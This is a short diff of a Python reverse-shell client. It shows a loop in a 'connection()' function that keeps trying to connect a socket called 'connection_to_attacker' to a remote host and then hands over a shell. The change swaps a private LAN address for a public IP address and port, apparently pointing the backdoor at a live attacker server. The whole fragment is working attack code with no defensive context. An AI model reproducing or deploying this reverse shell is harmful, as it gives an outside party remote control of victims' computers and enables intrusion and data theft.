@@ -303,7 +303,7 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            connection_to_attacker.connect(("192.168.0.105", 8081))
+            connection_to_attacker.connect(("107.173.87.48", 8999))
             shell()
             connection_to_attacker.close()
             break
